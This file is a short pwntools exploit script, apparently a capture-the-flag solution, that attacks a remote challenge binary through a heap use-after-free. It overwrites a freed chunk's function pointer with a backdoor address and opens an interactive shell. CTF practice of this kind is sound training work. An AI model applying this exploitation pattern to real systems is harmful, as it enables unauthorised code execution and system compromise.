from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./bjdctf_2020_YDSneedGrirlfriend"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28894)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice :", "1")
    sa("Her name size is :", str(size))
    sa("Her name is :", con)

def free(index):
    sa("Your choice :", "2")
    sa("Index :", str(index))

def show(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))


back_door = 0x0400B9C

# uaf
add(0x20, "a")
add(0x20, "a")
free(0)
free(1)
add(0x10, p64(back_door))
show(0)

shell()


